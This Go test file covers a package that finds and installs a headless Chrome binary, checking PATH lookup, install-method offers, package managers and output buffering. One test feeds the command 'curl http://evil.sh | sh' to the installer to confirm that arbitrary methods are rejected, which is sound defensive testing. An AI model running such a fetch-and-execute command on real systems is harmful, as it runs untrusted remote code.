package browser

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// stubLookPath replaces PATH lookup for the duration of a test.
func stubLookPath(t *testing.T, found map[string]string) {
	t.Helper()
	old := lookPath
	lookPath = func(name string) (string, error) {
		if p, ok := found[name]; ok {
			return p, nil
		}
		return "", errors.New("not on PATH")
	}
	t.Cleanup(func() { lookPath = old })
}

// stubFallbackPaths removes the platform install-location probes for the
// duration of a test, so resolution does not depend on whether Chrome or Edge
// happens to be installed on the machine running the suite.
func stubFallbackPaths(t *testing.T) {
	t.Helper()
	old := execFallbackPaths
	execFallbackPaths = func() []string { return nil }
	t.Cleanup(func() { execFallbackPaths = old })
}

func TestResolveExecInstallRoot(t *testing.T) {
	stubLookPath(t, nil)
	stubFallbackPaths(t)
	root := t.TempDir()
	dir := filepath.Join(root, "chrome-headless-shell-linux64")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	// A file the OS does not treat as executable must not count — unix reads
	// the mode bit, Windows the extension (mode bits cannot be set there).
	nonExec := "chrome-headless-shell"
	if runtime.GOOS == "windows" {
		nonExec += ".txt"
	}
	if err := os.WriteFile(filepath.Join(dir, nonExec), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := resolveExec("", root); err == nil {
		t.Fatal("non-executable install artifact should not resolve")
	}
	exe := "chrome-headless-shell"
	if runtime.GOOS == "windows" {
		exe += ".exe"
	}
	bin := filepath.Join(dir, exe)
	// On unix this is the same name as the non-executable file above — the
	// Chmod is what flips it executable (WriteFile keeps the existing mode).
	if err := os.WriteFile(bin, []byte("x"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(bin, 0o755); err != nil {
		t.Fatal(err)
	}
	got, err := resolveExec("", root)
	want, _ := filepath.EvalSymlinks(bin)
	gotEval, _ := filepath.EvalSymlinks(got)
	if err != nil || gotEval != want {
		t.Fatalf("resolveExec = %q, %v — want %q", got, err, want)
	}
}

func TestResolveExecOverrideWins(t *testing.T) {
	stubLookPath(t, nil)
	if got, err := resolveExec("/opt/custom-chrome", ""); err != nil || got != "/opt/custom-chrome" {
		t.Fatalf("override = %q, %v", got, err)
	}
}

func TestOfferListsViableMethods(t *testing.T) {
	stubLookPath(t, map[string]string{"apt-get": "/usr/bin/apt-get"})
	stubFallbackPaths(t)
	offer := Offer("", t.TempDir())
	if !offer.Missing {
		t.Fatal("nothing resolves, offer must say missing")
	}
	ids := map[string]bool{}
	for _, m := range offer.Methods {
		ids[m.ID] = true
		if m.Detail == "" {
			t.Errorf("method %s has no detail to show the user", m.ID)
		}
	}
	if cftPlatform() != "" && !ids["download"] {
		t.Errorf("a Chrome for Testing build exists for %s — download method must be offered", offer.Platform)
	}
	if !ids["pkg:apt"] {
		t.Error("apt-get is on PATH — the package method must be offered")
	}
	if ids["pkg:dnf"] {
		t.Error("dnf is not on PATH — must not be offered")
	}
}

func TestOfferNoDownloadWithoutInstallRoot(t *testing.T) {
	stubLookPath(t, nil)
	stubFallbackPaths(t)
	offer := Offer("", "")
	for _, m := range offer.Methods {
		if m.ID == "download" {
			t.Fatal("no install root — the download method must not be offered")
		}
	}
}

func TestInstallRejectsUnknownMethod(t *testing.T) {
	stubLookPath(t, nil)
	if _, err := Install(context.Background(), "", t.TempDir(), "curl http://evil.sh | sh", &TailWriter{max: 1024}); err == nil ||
		!strings.Contains(err.Error(), "unknown install method") {
		t.Fatalf("arbitrary method must be rejected, got %v", err)
	}
	if _, err := Install(context.Background(), "", t.TempDir(), "pkg:emerge", &TailWriter{max: 1024}); err == nil {
		t.Fatal("unlisted package managers must be rejected")
	}
}

func TestInstallPkgMissingBinary(t *testing.T) {
	stubLookPath(t, nil)
	_, err := Install(context.Background(), "", t.TempDir(), "pkg:apt", &TailWriter{max: 1024})
	if err == nil || !strings.Contains(err.Error(), "not on PATH") {
		t.Fatalf("install must refuse a package manager that is absent, got %v", err)
	}
}

func TestProotLikeEnv(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("proot detection is linux-only")
	}
	t.Setenv("PROOT_L2S_DIR", "/data/data/com.termux/files/usr/tmp")
	if !ProotLike() {
		t.Fatal("PROOT_L2S_DIR must mark the environment as proot")
	}
}

func TestTailWriterKeepsTail(t *testing.T) {
	w := &TailWriter{max: 8}
	if _, err := w.Write([]byte("0123456789abcdef")); err != nil {
		t.Fatal(err)
	}
	if got := w.String(); got != "89abcdef" {
		t.Fatalf("tail = %q", got)
	}
}
